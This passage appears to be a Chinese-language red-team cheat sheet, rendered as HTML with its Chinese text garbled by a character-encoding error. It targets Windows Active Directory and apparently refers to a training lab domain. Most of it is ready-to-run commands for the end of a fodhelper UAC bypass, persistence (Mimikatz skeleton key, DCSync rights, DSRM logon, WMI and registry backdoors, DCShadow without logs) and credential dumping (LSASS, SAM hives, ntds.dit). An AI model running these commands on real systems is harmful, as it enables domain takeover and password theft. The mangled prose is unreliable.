<span class="string">"C:\Windows\System32\fodhelper.exe"</span> -WindowStyle Hidden</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Clean registry</span></span><br><span class="line"><span class="built_in">Start-Sleep</span> <span class="number">3</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="string">"HKCU:\Software\Classes\ms-settings\"</span> -Recurse -Force</span><br></pre></td></tr></table></figure><h2 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h2><h3 id="å¯åŠ¨æ–‡ä»¶å¤¹"><a href="#å¯åŠ¨æ–‡ä»¶å¤¹" class="headerlink" title="å¯åŠ¨æ–‡ä»¶å¤¹"></a>å¯åŠ¨æ–‡ä»¶å¤¹</h3><p>åªéœ€åˆ é™¤ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å³å¯ã€‚ç»å…¸ğŸ˜ğŸš©</p><p>åœ¨å½“å‰ç”¨æˆ·æ–‡ä»¶å¤¹ä¸­ï¼Œå°†åœ¨å½“å‰ç”¨æˆ·ç™»å½•æ—¶è§¦å‘ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><p>æˆ–åœ¨å¯åŠ¨æ–‡ä»¶å¤¹ä¸­ï¼Œéœ€è¦ç®¡ç†ç‰¹æƒï¼Œä½†åœ¨å¯åŠ¨æ—¶<em>ä»¥åŠ</em>ä»»ä½•ç”¨æˆ·ç™»å½•æ—¶å°†ä»¥SYSTEMèº«ä»½è§¦å‘ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br></pre></td></tr></table></figure><h2 id="åŸŸæŒä¹…æ€§"><a href="#åŸŸæŒä¹…æ€§" class="headerlink" title="åŸŸæŒä¹…æ€§"></a>åŸŸæŒä¹…æ€§</h2><p>å¿…é¡»ä»¥DAç‰¹æƒè¿è¡Œã€‚</p><h3 id="Mimikatzä¸‡èƒ½é’¥åŒ™æ”»å‡»"><a href="#Mimikatzä¸‡èƒ½é’¥åŒ™æ”»å‡»" class="headerlink" title="Mimikatzä¸‡èƒ½é’¥åŒ™æ”»å‡»"></a>Mimikatzä¸‡èƒ½é’¥åŒ™æ”»å‡»</h3><p>ä»DCè¿è¡Œã€‚ä¸ºæ‰€æœ‰ç”¨æˆ·ğŸš©å¯ç”¨å¯†ç â€œ mimikatzâ€ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨PowerViewæˆäºˆç‰¹å®šçš„ç”¨æˆ·DCSyncæƒé™"><a href="#ä½¿ç”¨PowerViewæˆäºˆç‰¹å®šçš„ç”¨æˆ·DCSyncæƒé™" class="headerlink" title="ä½¿ç”¨PowerViewæˆäºˆç‰¹å®šçš„ç”¨æˆ·DCSyncæƒé™"></a>ä½¿ç”¨PowerViewæˆäºˆç‰¹å®šçš„ç”¨æˆ·DCSyncæƒé™</h3><p>éšæ—¶ä¸ºæ‚¨æä¾›ç”¨æˆ·é€‰æ‹©çš„DCSyncæƒé™ã€‚åœ¨æŸäº›è®¾ç½®ä¸­å¯èƒ½ä¼šé€ƒé¿æ£€æµ‹ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-ObjectACL -TargetDistinguishedName <span class="string">"dc=dollarcorp,dc=moneycorp,dc=local"</span> -PrincipalSamAccountName student355 -Rights DCSync</span><br></pre></td></tr></table></figure><h3 id="åŸŸæ§åˆ¶å™¨DSRMç®¡ç†å‘˜"><a href="#åŸŸæ§åˆ¶å™¨DSRMç®¡ç†å‘˜" class="headerlink" title="åŸŸæ§åˆ¶å™¨DSRMç®¡ç†å‘˜"></a>åŸŸæ§åˆ¶å™¨DSRMç®¡ç†å‘˜</h3><p>DSRMç®¡ç†å‘˜æ˜¯DCçš„æœ¬åœ°ç®¡ç†å‘˜å¸æˆ·ã€‚é¦–å…ˆéœ€è¦å¯ç”¨è¿œç¨‹ç™»å½•ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="string">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span> -Name <span class="string">"DsrmAdminLogonBehavior"</span> -Value <span class="number">2</span> -PropertyType DWORD</span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¹‹å‰è½¬å‚¨åœ¨DCä¸Šçš„æœ¬åœ°ç®¡ç†å“ˆå¸Œå€¼è¿œç¨‹ç™»å½•ï¼ˆä½¿ç”¨<code>lsadump::sam</code>ï¼Œè¯·å‚è§ä¸‹é¢çš„â€œä½¿ç”¨Mimikatzè½¬å‚¨ç§˜å¯†â€ï¼‰ã€‚ä½¿ç”¨ä¾‹å¦‚â€œè¶Šè¿‡å“ˆå¸Œâ€æ¥è·å¾—ä¼šè¯ï¼ˆè¯·å‚è§ä¸Šé¢çš„â€œ Mimikatzâ€ï¼‰ã€‚</p><h3 id="ä¿®æ”¹å®‰å…¨æè¿°ç¬¦ä»¥è¿›è¡Œè¿œç¨‹WMIè®¿é—®"><a href="#ä¿®æ”¹å®‰å…¨æè¿°ç¬¦ä»¥è¿›è¡Œè¿œç¨‹WMIè®¿é—®" class="headerlink" title="ä¿®æ”¹å®‰å…¨æè¿°ç¬¦ä»¥è¿›è¡Œè¿œç¨‹WMIè®¿é—®"></a>ä¿®æ”¹å®‰å…¨æè¿°ç¬¦ä»¥è¿›è¡Œè¿œç¨‹WMIè®¿é—®</h3><p>ä½¿ç”¨<code>Set-RemoteWMI.ps1</code>cmdletå‘ç”¨æˆ·WMIè®¿é—®è®¡ç®—æœºã€‚å¯ä»¥è¿è¡Œä»¥æŒä¹…è®¿é—®ä¾‹å¦‚DCã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace <span class="string">'root\cimv2'</span></span><br></pre></td></tr></table></figure><p>æœ‰å…³æ‰§è¡Œï¼Œè¯·å‚è§ä¸Šé¢çš„â€œä½¿ç”¨WMIæ‰§è¡Œå‘½ä»¤â€ã€‚</p><h3 id="ä¿®æ”¹PowerShellè¿œç¨‹è®¿é—®çš„å®‰å…¨æè¿°ç¬¦"><a href="#ä¿®æ”¹PowerShellè¿œç¨‹è®¿é—®çš„å®‰å…¨æè¿°ç¬¦" class="headerlink" title="ä¿®æ”¹PowerShellè¿œç¨‹è®¿é—®çš„å®‰å…¨æè¿°ç¬¦"></a>ä¿®æ”¹PowerShellè¿œç¨‹è®¿é—®çš„å®‰å…¨æè¿°ç¬¦</h3><p>ä½¿ç”¨<code>Set-RemotePSRemoting.ps1</code>cmdletå‘ç”¨æˆ·PowerShellè¿œç¨‹è®¿é—®è®¡ç®—æœºã€‚å¯ä»¥è¿è¡Œä»¥æŒä¹…è®¿é—®ä¾‹å¦‚DCã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure><p>æœ‰å…³æ‰§è¡Œï¼Œè¯·å‚è§ä¸Šé¢çš„â€œä½¿ç”¨PowerShell Remotingæ‰§è¡Œå‘½ä»¤â€ã€‚</p><h3 id="ä¿®æ”¹DCæ³¨å†Œè¡¨å®‰å…¨æè¿°ç¬¦ä»¥ä½¿ç”¨DAMPè¿›è¡Œè¿œç¨‹å“ˆå¸Œæ£€ç´¢"><a href="#ä¿®æ”¹DCæ³¨å†Œè¡¨å®‰å…¨æè¿°ç¬¦ä»¥ä½¿ç”¨DAMPè¿›è¡Œè¿œç¨‹å“ˆå¸Œæ£€ç´¢" class="headerlink" title="ä¿®æ”¹DCæ³¨å†Œè¡¨å®‰å…¨æè¿°ç¬¦ä»¥ä½¿ç”¨DAMPè¿›è¡Œè¿œç¨‹å“ˆå¸Œæ£€ç´¢"></a>ä¿®æ”¹DCæ³¨å†Œè¡¨å®‰å…¨æè¿°ç¬¦ä»¥ä½¿ç”¨DAMPè¿›è¡Œè¿œç¨‹å“ˆå¸Œæ£€ç´¢</h3><p>ä½¿ç”¨<a href="https://github.com/HarmJ0y/DAMP" target="_blank" rel="noopener">DAMPå·¥å…·</a>ï¼Œæˆ‘ä»¬å°±å¯ä»¥å€Ÿå£³DCæ³¨å†Œè¡¨æ¥ç»™æˆ‘ä»¬ä¸Šçš„è®¿é—®<code>SAM</code>ï¼Œ<code>SYSTEM</code>ä»¥åŠ<code>SECURITY</code>æ³¨å†Œè¡¨é…ç½®å•å…ƒã€‚è¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿè¿œç¨‹è½¬å‚¨DCæœºå¯†ï¼ˆå“ˆå¸Œï¼‰ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨<code>Add-RemoteRegBackdoor.ps1</code>æ¥è‡ªDAMPçš„cmdletæ·»åŠ åé—¨ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee Student355</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>RemoteHashRetrieval.ps1</code>DAMPä¸­çš„cmdletè¿œç¨‹è½¬å‚¨ç§˜å¯†ï¼ˆä»¥â€œå—ä¿¡ä»»â€ç”¨æˆ·èº«ä»½è¿è¡Œï¼‰ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·å–é’ˆå¯¹é“¶ç¥¨æ”»å‡»çš„æœºå™¨å¸æˆ·å“ˆå¸Œ</span></span><br><span class="line">Get-RemoteMachineAccountHash -ComputerName dcorp-dc</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æœ¬åœ°å¸æˆ·å“ˆå¸Œ</span></span><br><span class="line">Get-RemoteLocalAccountHash -ComputerName dcorp-dc</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç¼“å­˜çš„å‡­æ®ï¼ˆå¦‚æœæœ‰ï¼‰</span></span><br><span class="line">Get-RemoteCachedCredential -ComputerName dcorp-dc</span><br></pre></td></tr></table></figure><h3 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h3><p>DCShadowæ˜¯ä¸€ç§é€šè¿‡ä¸´æ—¶æ¨¡ä»¿åŸŸæ§åˆ¶å™¨æ¥æ©ç›–æŸäº›åŠ¨ä½œçš„æ”»å‡»ã€‚å¦‚æœæ‚¨åœ¨æ ¹åŸŸä¸­å…·æœ‰Domain Adminæˆ–Enterprise Adminç‰¹æƒï¼Œåˆ™å¯ä»¥å°†å…¶ç”¨äºæ—çº§åˆ«çš„æŒä¹…æ€§ã€‚</p><p>ï¼ˆå¯é€‰ï¼‰ä½œä¸ºåŸŸç®¡ç†å‘˜ï¼Œä¸ºé€‰å®šçš„ç”¨æˆ·æä¾›DCShadowæ”»å‡»æ‰€éœ€çš„ç‰¹æƒï¼ˆä½¿ç”¨<code>Set-DCShadowPermissions.ps1</code>cmdletï¼‰ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DCShadowPermissions -FakeDC mcorp-student35 -SamAccountName root355user -Username student355 -Verbose</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œåœ¨ä»»ä½•è®¡ç®—æœºä¸Šï¼Œä½¿ç”¨Mimikatzè¿›è¡ŒDCShadowæ”»å‡»ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># ä¸ºç”¨æˆ·è®¾ç½®SPN</span><br><span class="line">lsadump::dcshadow /object:root355user /attribute:servicePrincipalName /value:&quot;SuperHacker/ServicePrincipalThingey&quot;</span><br><span class="line"></span><br><span class="line"># è®¾ç½®ç”¨æˆ·çš„SIDå†å²è®°å½•ï¼ˆæœ‰æ•ˆåœ°æˆäºˆä»–ä»¬ä¼ä¸šç®¡ç†å‘˜æƒé™ï¼‰</span><br><span class="line">lsadump::dcshadow /object:root355user /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519</span><br><span class="line"></span><br><span class="line"># ä¸ºç”¨æˆ·è®¾ç½®AdminSDHolderå®¹å™¨ä¸Šçš„å®Œå…¨æ§åˆ¶æƒé™</span><br><span class="line">## éœ€è¦æ£€ç´¢å½“å‰çš„ACLï¼š</span><br><span class="line">(New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local&quot;)).psbase.ObjectSecurity.sddl</span><br><span class="line"></span><br><span class="line">## ç„¶åè·å–ç›®æ ‡ç”¨æˆ·çš„SIDï¼š</span><br><span class="line">Get-NetUser -UserName student355 | select objectsid</span><br><span class="line"></span><br><span class="line">## æœ€åï¼Œæ·»åŠ å®Œå…¨æ§åˆ¶åŸè¯­ (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) for user</span><br><span class="line">lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-45109)</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œä»DAä¼šè¯æˆ–ä»¥å‰æä¾›DCShadowPermissionsçš„ç”¨æˆ·çš„ä¼šè¯ä¸­ï¼Œè¿è¡ŒDCShadowæ”»å‡»ã€‚å…ˆå‰ä¸Šæ¼”çš„åŠ¨ä½œå°†åœ¨ä¸ä¿ç•™æ—¥å¿—çš„æƒ…å†µä¸‹æ‰§è¡ŒğŸ˜ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcshadow /push</span><br></pre></td></tr></table></figure><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post-Exploitation"></a>Post-Exploitation</h2><h3 id="LSASSä¿æŠ¤"><a href="#LSASSä¿æŠ¤" class="headerlink" title="LSASSä¿æŠ¤"></a>LSASSä¿æŠ¤</h3><p>æœ‰æ—¶ï¼ŒLSASSè¢«é…ç½®ä¸ºä½œä¸ºå—ä¿æŠ¤è¿›ç¨‹ï¼ˆPPLï¼‰è¿è¡Œã€‚æ‚¨å¯ä»¥ä½¿ç”¨PowerShellè¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ItemProperty</span> -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name <span class="string">"RunAsPPL"</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨ä¸ä»…å¯ä»¥è½¬å‚¨æˆ–è§£æLSASSï¼Œè¿˜éœ€è¦ä½¿ç”¨ç¦ç”¨è¯¥ä¿æŠ¤<code>mimidrv.sys</code>ã€‚æˆ‘ä¸ä¼šåœ¨è¿™é‡Œè®¨è®ºå¦‚ä½•åšã€‚</p><h3 id="Dumping-secrets-with-Mimikatz"><a href="#Dumping-secrets-with-Mimikatz" class="headerlink" title="Dumping secrets with Mimikatz"></a>Dumping secrets with Mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># è½¬å‚¨ç™»å½•å¯†ç </span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line"># ä»DCè½¬å‚¨æ‰€æœ‰åŸŸæ•£åˆ—</span><br><span class="line">## æ³¨æ„ï¼šå¸¦æœ‰/patchçš„æ‰€æœ‰å†…å®¹éƒ½å¾ˆå˜ˆæ‚ï¼Œå› ä¸ºå®ƒ_writes_åˆ°LSASSğŸš©</span><br><span class="line">lsadump::lsa /patch</span><br><span class="line"></span><br><span class="line"># ä»…è½¬å‚¨æœ¬åœ°ç”¨æˆ·</span><br><span class="line">lsadump::sam</span><br><span class="line"></span><br><span class="line"># DCSync (requires &apos;ldap&apos; SPN)</span><br><span class="line">lsadump::dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure><p>Windows Credential Vaultè½¬å‚¨</p><blockquote><p>æˆ‘åœ¨å’Œä¸€èµ·ä½¿ç”¨æ—¶é‡åˆ°äº†ä¸€äº›é—®é¢˜<code>Invoke-Mimikatz.ps1</code>ã€‚å¦‚æœé‡åˆ°é—®é¢˜ï¼Œè¯·å°è¯•ä½¿ç”¨æœ¬æœºMimikatzã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># è½¬å‚¨Windowsæœºå¯†ï¼Œä¾‹å¦‚è®¡åˆ’ä»»åŠ¡çš„å­˜å‚¨å‡­æ®ï¼ˆå…ˆæå‡æƒé™ï¼‰</span><br><span class="line">vault::list</span><br><span class="line">vault::cred /patch</span><br><span class="line"></span><br><span class="line"># è½¬å‚¨Windowsæœºå¯†DPAPIæ–¹æ³•ï¼ˆå™ªéŸ³å°‘ï¼Œæ²¡æœ‰ç‰¹å®šæƒé™ï¼Œéœ€è¦ï¼‰</span><br><span class="line">## æ›´å¤šä¿¡æ¯: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials</span><br><span class="line">## é¦–å…ˆï¼Œè·å–ç‰¹å®šå¯†é’¥çš„ä¸»å¯†é’¥çš„GUID</span><br><span class="line">dpapi::cred /in:C:\Users\appadmin\AppData\local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D</span><br><span class="line"></span><br><span class="line">## LSASSçš„EITHER Grab dpapié”®</span><br><span class="line">sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line">## æˆ–æŠ“å–å¹¶ç¼“å­˜ç‰¹å®šå¯†é’¥</span><br><span class="line">dpapi::masterkey /rpc /in:C:\Users\appadmin\AppData\Roaming\Microsoft\Protect\S-1-5-21-3965405831-1015596948-2589850225-1118\a89b97d2-b520-462d-a924-d57df68c543b</span><br><span class="line"></span><br><span class="line">## Mimikatzå°†ç¼“å­˜ä¸»å¯†é’¥ï¼ˆä½¿ç”¨dpapi::cacheæ£€æŸ¥ï¼‰</span><br><span class="line">## Then run the initial dpapi::cred command again to get the juice!</span><br></pre></td></tr></table></figure><h3 id="æ²¡æœ‰Mimikatzçš„å¯†ç hashè½¬å‚¨"><a href="#æ²¡æœ‰Mimikatzçš„å¯†ç hashè½¬å‚¨" class="headerlink" title="æ²¡æœ‰Mimikatzçš„å¯†ç hashè½¬å‚¨"></a>æ²¡æœ‰Mimikatzçš„å¯†ç hashè½¬å‚¨</h3><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥è§£æç³»ç»Ÿæœºå¯†ï¼Œè€Œæ— éœ€åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šç›´æ¥ä½¿ç”¨Mimikatzã€‚</p><h4 id="Dumping-LSASS"><a href="#Dumping-LSASS" class="headerlink" title="Dumping LSASS"></a>Dumping LSASS</h4><p>è¿è¡ŒMimikatzçš„é¦–é€‰æ–¹æ³•æ˜¯ä½¿ç”¨ç›®æ ‡ä¸­LSASSå†…å­˜çš„è½¬å‚¨å‰¯æœ¬åœ¨æœ¬åœ°è¿›è¡Œã€‚<a href="https://github.com/outflanknl/Dumpert" target="_blank" rel="noopener">Dumpert</a>ï¼Œ<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noopener">Procdump</a>æˆ–å…¶ä»–ï¼ˆè‡ªå®šä¹‰ï¼‰å·¥å…·å¯ç”¨äºè½¬å‚¨LSASSå†…å­˜ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é€šè¿‡è¿›ç¨‹å¿«ç…§ï¼ˆ-rï¼‰è½¬å‚¨LSASSå†…å­˜ï¼Œé¿å…ä¸ä¹‹ç›´æ¥äº¤äº’</span></span><br><span class="line">.\procdump.exe -r -ma lsass.exe lsass.dmp</span><br><span class="line"><span class="comment"># æˆ–è€…ä»»åŠ¡ç®¡ç†å™¨æ‰¾åˆ°lsass.exeè¿›ç¨‹å³é”®åˆ›å»ºè½¬å‚¨æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p>åœ¨æˆ‘ä»¬çš„æ”»å‡»ç³»ç»Ÿä¸Šä¸‹è½½å†…å­˜è½¬å‚¨æ–‡ä»¶åï¼Œæˆ‘ä»¬å¯ä»¥è¿è¡ŒMimikatzå¹¶åˆ‡æ¢åˆ°â€œ Minidumpâ€æ¨¡å¼ä»¥å¦‚ä¸‹æ–¹å¼è§£ææ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure><h4 id="Dumping-secrets-from-the-registry"><a href="#Dumping-secrets-from-the-registry" class="headerlink" title="Dumping secrets from the registry"></a>Dumping secrets from the registry</h4><p>æˆ‘ä»¬å¯ä»¥ä»æ³¨å†Œè¡¨ä¸­è½¬å‚¨æœºå¯†å¹¶â€œç¦»çº¿â€è§£ææ–‡ä»¶ï¼Œä»¥è·å–ç³»ç»Ÿæœºå¯†åˆ—è¡¨ã€‚ğŸš©</p><p>åœ¨ç›®æ ‡ä¸Šï¼Œæˆ‘ä»¬è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg.exe save hklm\sam c:\users\public\downloads\sam.save</span><br><span class="line">reg.exe save hklm\system c:\users\public\downloads\system.save</span><br><span class="line">reg.exe save hklm\security c:\users\public\downloads\security.save</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œåœ¨æˆ‘ä»¬çš„æ”»å‡»ç›’å­ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Impacketä¸¢å¼ƒç§˜å¯†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL &gt; secrets.out</span><br></pre></td></tr></table></figure><h4 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a>ntdsutil</h4><p>ntdsutil win2008å¼€å§‹DCä¸­è‡ªå¸¦çš„å·¥å…·</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#äº¤äº’å¼</span></span><br><span class="line">ntdsutil</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds</span><br><span class="line">create</span><br><span class="line">mount [GUID]</span><br><span class="line"><span class="comment"># copy å®Œä¹‹åå†æ‰§è¡Œ</span></span><br><span class="line">unmout  [GUID]</span><br><span class="line">del [GUID]</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># éäº¤äº’å¼</span></span><br><span class="line">ntdsutil snapshot <span class="string">"activate instance ntds"</span> create quit quit</span><br><span class="line">ntdsutil snapshot <span class="string">"mount &#123;GUID&#125;"</span> quit quit</span><br><span class="line">copy MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit</span><br><span class="line">ntdsutil snapshot <span class="string">"unmount &#123;GUID&#125;"</span> <span class="string">"delete &#123;GUID&#125;"</span> quit quit</span><br></pre></td></tr></table></figure><h4 id="QuarkPwDumpåˆ†æ-ä¸‹è½½åœ°å€-https-github-com-quarkslab-quarkspwdump"><a href="#QuarkPwDumpåˆ†æ-ä¸‹è½½åœ°å€-https-github-com-quarkslab-quarkspwdump" class="headerlink" title="QuarkPwDumpåˆ†æ [ä¸‹è½½åœ°å€][https://github.com/quarkslab/quarkspwdump]"></a>QuarkPwDumpåˆ†æ [ä¸‹è½½åœ°å€][<a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">https://github.com/quarkslab/quarkspwdump</a>]</h4><p>åœ¨çº¿æå–ï¼ˆç›´æ¥åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œï¼Œå®æˆ˜ä¸­ä¸é€‰æ‹©æ­¤æ–¹å¼ã€‚ï¼‰</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit</span><br></pre></td></tr></table></figure><p>ç¦»çº¿æå– éœ€è¦ä¸¤ä¸ªæ–‡ä»¶ ntds.dit å’Œ system.hive ï¼Œ å…¶ä¸­system.hiveå¯é€šè¿‡reg save hklm\system system.hiveè·å–</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hive &gt;c:\hash.txt</span><br></pre></td></tr></table></figure><h4 id="ntdsutil-ifm-æ¨¡å—"><a href="#ntdsutil-ifm-æ¨¡å—" class="headerlink" title="ntdsutil: ifm æ¨¡å—"></a>ntdsutil: ifm æ¨¡å—</h4><p>WINDOWS SERVER 2008-2016</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; ntdsutil</span><br><span class="line">ntdsutil: activate instance ntds</span><br><span class="line">ntdsutil: ifm</span><br><span class="line">ifm: create full c:\audit</span><br><span class="line">ifm: quit</span><br><span class="line">ntdsutil: quit</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨NtdsAudit.exe<a href="https://github.com/Dionach/NtdsAudit/releases/download/v2.0.5/NtdsAudit.exe" target="_blank" rel="noopener">ä¸‹è½½åœ°å€</a>è§£å‡ºntdsçš„hash</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NtdsAudit.exe <span class="string">"ntds.dit"</span> -s <span class="string">"SYSTEM"</span> -p pwdump.txt --users-csv users.csv</span><br></pre></td></tr></table></figure><p>NtdsAuditéœ€è¦<code>ntds.dit</code> Active Directoryæ•°æ®åº“ï¼Œ<code>SYSTEM</code> å¦‚æœè½¬å‚¨å¯†ç å“ˆå¸Œï¼Œåˆ™éœ€è¦æ³¨å†Œè¡¨é…ç½®å•å…ƒã€‚è¿™äº›æ–‡ä»¶ç”±åŸŸæ§åˆ¶å™¨é”å®šï¼Œå› æ­¤æ— 